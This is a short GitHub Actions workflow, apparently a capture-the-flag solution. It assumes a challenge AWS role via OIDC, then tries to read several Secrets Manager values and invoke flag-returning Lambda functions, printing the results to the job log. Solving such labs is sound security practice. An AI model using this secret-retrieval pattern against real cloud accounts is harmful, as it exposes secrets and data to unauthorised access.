name: Get Flag (Targeted)

on: workflow_dispatch

permissions:
  id-token: write
  contents: read

jobs:
  get-flag:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: us-east-1

      - name: Try to Get Secret Named 'flag'
        run: |
          echo "=== Trying to get secret named 'flag' ==="
          aws secretsmanager get-secret-value --secret-id flag --query SecretString --output text || echo "Not found"

      - name: Try to Get Secret Named 'encrypted-flag'
        run: |
          echo "=== Trying to get secret named 'encrypted-flag' ==="
          aws secretsmanager get-secret-value --secret-id encrypted-flag --query SecretString --output text || echo "Not found"

      - name: Try to Get Secret Named 'imaginary-flag'
        run: |
          echo "=== Trying to get secret named 'imaginary-flag' ==="
          aws secretsmanager get-secret-value --secret-id imaginary-flag --query SecretString --output text || echo "Not found"

      - name: Try to Invoke Lambda Function 'get-flag'
        run: |
          echo "=== Trying to invoke Lambda function 'get-flag' ==="
          aws lambda invoke --function-name get-flag /tmp/flag.txt && cat /tmp/flag.txt || echo "Lambda invocation failed"

      - name: Try to Invoke Lambda Function 'decrypt-flag'
        run: |
          echo "=== Trying to invoke Lambda function 'decrypt-flag' ==="
          aws lambda invoke --function-name decrypt-flag /tmp/flag.txt && cat /tmp/flag.txt || echo "Lambda invocation failed"
